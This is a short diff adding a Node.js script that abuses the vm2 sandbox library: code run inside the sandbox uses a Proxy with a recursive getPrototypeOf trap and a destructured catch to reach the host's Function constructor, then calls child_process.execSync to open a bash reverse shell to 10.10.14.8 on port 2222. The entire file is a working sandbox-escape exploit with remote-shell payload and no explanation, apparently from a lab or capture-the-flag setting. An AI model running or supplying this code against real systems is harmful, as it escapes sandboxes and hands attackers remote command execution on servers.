@@ -1,0 +1,22 @@
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code= `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) { 
+      c.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.14.8/2222 0>&1"');
+
+}
+`
+console.log(vm.run(code));
